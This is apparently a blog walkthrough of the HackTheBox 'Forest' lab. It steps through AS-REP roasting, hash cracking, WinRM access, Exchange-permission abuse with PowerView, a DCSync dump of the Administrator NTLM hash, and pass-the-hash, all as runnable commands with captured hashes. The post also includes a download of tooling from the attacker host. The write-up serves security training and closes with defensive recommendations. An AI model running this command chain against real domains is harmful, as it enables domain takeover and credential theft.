---
layout: post
title: "Forest HTB Walkthrough: Active Directory Exploitation via AS-REP Roasting and DCSync"
date: 2025-05-18 14:00:00 -0500
categories: [Penetration Testing, Active Directory]
tags: [HackTheBox, Active Directory, AS-REP Roasting, DCSync, Privilege Escalation, Kerberos, PowerView]
description: "Complete walkthrough of the Forest machine on HackTheBox, demonstrating AS-REP roasting, Exchange Windows Permissions abuse, and DCSync attacks to compromise a Windows domain controller."
image: assets/blog/forest.png
toc: true
math: false
---

## Overview

Forest is a Windows-based machine on HackTheBox that provides excellent practice for Active Directory exploitation techniques. This walkthrough demonstrates several critical attack vectors including AS-REP roasting, Exchange Windows Permissions abuse, and DCSync attacks to achieve full domain compromise.

**Target Information:**
- **Target IP:** 10.10.10.161
- **Attacker IP:** 10.10.14.3
- **Domain:** htb.local
- **Hostname:** FOREST

## Initial Reconnaissance

### Host Configuration

First, I added the target to my hosts file for easier reference:

```bash
echo "10.10.10.161 forest.htb" | sudo tee -a /etc/hosts
```

### Port Scanning

I performed an aggressive Nmap scan to identify open services:

```bash
nmap -T4 -A -v 10.10.10.161
```

**Key Findings:**

| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows NetBIOS-SSN |
| 389 | LDAP | Active Directory LDAP |
| 445 | SMB | Windows Server 2016 Standard |
| 464 | Kpasswd5 | Password change service |
| 593 | RPC/HTTP | Microsoft Windows RPC over HTTP |
| 636 | LDAPS | LDAP over SSL |
| 3268 | Global Catalog | Active Directory Global Catalog |
| 3269 | Global Catalog SSL | GC over SSL |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

**OS Detection:** Windows Server 2016 Standard 14393  
**Domain:** htb.local  
**Computer Name:** FOREST

### DNS Enumeration

I attempted DNS zone enumeration:

```bash
dig @10.10.10.161 htb.local
```

The DNS server responded with the domain controller's IP address, but zone transfers were not permitted.

### SMB Enumeration

Attempted to enumerate SMB shares anonymously, but no shares were accessible without authentication. This suggested that null session enumeration was disabled.

## User Enumeration via RPC

With SMB enumeration unsuccessful, I pivoted to RPC enumeration to identify domain users. Using anonymous RPC binding, I successfully enumerated the following user accounts:

- Administrator
- Guest
- krbtgt
- DefaultAccount
- sebastien
- lucinda
- andy
- mark
- santi
- svc-alfresco

I saved these usernames to `users.txt` for further testing, excluding service accounts like HealthMailbox and SM_ accounts that appeared to be system-managed.

## AS-REP Roasting Attack

### Concept

AS-REP roasting exploits accounts that have the "Do not require Kerberos preauthentication" setting enabled. For these accounts, an attacker can request a Ticket Granting Ticket (TGT) without prior authentication, and the returned ticket contains encrypted material that can be cracked offline.

### Execution

I used Impacket's `GetNPUsers.py` script to test each enumerated user:

```bash
for user in $(cat users.txt); do 
  python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket
done
```

**Result:** The `svc-alfresco` account was vulnerable to AS-REP roasting and returned a Kerberos hash:

```
$krb5asrep$23$svc-alfresco@HTB:4c994589f21f5488522e58fa9e8d5492$a08d7f818f228dccc012b543ce2c15f846eb49b70e5102a3ef9923e5cc52a080455d5fd90006ba099cc9395ad6cf2fc0a196481342ec17934fbcfa26cd060949bd7f849d62adbb84e9bc25bcf43748e44affebaac89502d6f3d171c37f950df04912dae29f5d525dd67acedbbfb8889a58dad8cafc99da2e042afe4efa4cc799445ca7d57c43247fd818f935ba1f08dfd88ede3b916159e71cf4e600ee054e22c04d29196581dca479cfe551a421e6acfaadfabb35b5b6dc0dbb5beb5f403125d29e9dea8dbf6ca8797dc08a091a60709b9161652f7e495e8a2c2a83fce7eca0
```

### Hash Cracking

I saved the hash and cracked it using John the Ripper with the rockyou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt svc-alfresco.hash
```

**Cracked Password:** `s3rvice`

## Initial Access

With valid credentials, I established a WinRM session as the `svc-alfresco` user:

```bash
evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
```

### User Flag

The user flag was located on the desktop:

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

**User Flag:** `686c****************************dd20b`

## Privilege Escalation

### Discovery: Exchange Windows Permissions

During enumeration of the domain, I discovered the `svc-alfresco` account had membership in several groups related to Exchange Server. More importantly, I identified the **Exchange Windows Permissions** group, which is known to have dangerous privileges in Active Directory environments.

The Exchange Windows Permissions group has WriteDACL permissions on the domain object, allowing members to grant themselves DCSync rights.

### Creating a Controlled User Account

To maintain operational security and avoid directly modifying the `svc-alfresco` account, I created a new domain user:

```powershell
net user marvel 'Passw0rd!' /add /domain
net group "Exchange Windows Permissions" marvel /add /domain
```

### Granting DCSync Rights with PowerView

I utilized PowerView.ps1, a PowerShell reconnaissance script, to grant my controlled user DCSync privileges.

**Setting up HTTP server on Kali:**

```bash
python3 -m http.server 8000
```

**Downloading PowerView to the target:**

```powershell
powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"
Invoke-WebRequest http://10.10.14.3:8000/PowerView.ps1 -OutFile .\PowerView.ps1
```

**Importing and executing PowerView:**

```powershell
Import-Module .\PowerView.ps1

$Sec = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\marvel',$Sec)
Add-ObjectAcl -PrincipalIdentity marvel -Rights DCSync -Credential $Cred
```

This command granted the `marvel` account Replicating Directory Changes and Replicating Directory Changes All permissions, enabling DCSync attacks.

## DCSync Attack

With DCSync rights established, I returned to my Kali machine and used Impacket's `secretsdump.py` to extract the Administrator's NTLM hash:

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  'marvel:Passw0rd!@10.10.10.161' \
  -just-dc-user Administrator \
  -just-dc-ntlm
```

**Administrator NTLM Hash:** `32693b11e6aa90eb43d32c72a07ceea6`

## Pass-the-Hash for Administrator Access

Using the extracted NTLM hash, I performed a pass-the-hash attack with Evil-WinRM:

```bash
evil-winrm -i forest.htb -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

This provided full administrative access to the domain controller.

### Root Flag

The root flag was located on the Administrator's desktop:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** `7788****************************b8a9`

## Attack Chain Summary

1. **Reconnaissance:** Nmap scan identified domain controller services
2. **User Enumeration:** RPC enumeration revealed domain users
3. **AS-REP Roasting:** Extracted hash for `svc-alfresco` account
4. **Hash Cracking:** Cracked Kerberos hash to obtain password `s3rvice`
5. **Initial Access:** WinRM authentication with compromised credentials
6. **Privilege Escalation:** Identified Exchange Windows Permissions group membership
7. **DACL Abuse:** Created user and granted DCSync rights via PowerView
8. **DCSync Attack:** Extracted Administrator NTLM hash
9. **Pass-the-Hash:** Achieved Domain Admin access

## Key Takeaways

### Vulnerabilities Exploited

- **Kerberos Pre-authentication Disabled:** The `svc-alfresco` account was vulnerable to AS-REP roasting
- **Weak Password Policy:** Service account used a weak, dictionary-based password
- **Exchange Permissions Misconfiguration:** Exchange Windows Permissions group had excessive privileges
- **WinRM Enabled:** Allowed remote PowerShell access for authenticated users

### Defensive Recommendations

1. **Enable Kerberos Pre-authentication:** Ensure all accounts require pre-authentication unless absolutely necessary
2. **Strong Password Policy:** Implement and enforce strong password requirements for all accounts, especially service accounts
3. **Principle of Least Privilege:** Review and restrict Exchange-related group permissions
4. **Monitor DCSync Attempts:** Implement detection for unauthorized replication requests
5. **Audit Account Permissions:** Regular audits of account group memberships and ACLs
6. **Restrict WinRM Access:** Limit WinRM to specific hosts and require MFA where possible

## Tools Used

- **Nmap:** Network reconnaissance and port scanning
- **Impacket Suite:** GetNPUsers.py, secretsdump.py
- **John the Ripper:** Password hash cracking
- **Evil-WinRM:** Windows Remote Management client
- **PowerView.ps1:** Active Directory enumeration and exploitation

## References

- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [AS-REP Roasting Explained](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

---

*This writeup is for educational purposes only. Always obtain proper authorization before performing security testing.*
